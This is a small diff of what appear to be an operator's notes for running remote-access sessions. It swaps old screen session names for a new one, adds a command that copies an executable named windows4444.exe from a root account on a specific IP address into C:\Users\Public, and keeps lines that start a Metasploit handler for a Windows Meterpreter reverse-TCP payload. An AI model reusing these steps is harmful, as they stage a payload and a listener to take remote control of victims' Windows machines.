@@ -1,8 +1,6 @@
-screen -r kamar5555
-screen -r kamar4444
-______________________________
-screen -r ruanganx64port53
- screen -r ruanganx64port8181
+scp root@188.166.181.139:windows4444.exe C:\Users\Public
+screen -r windows4444
+
 
  use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
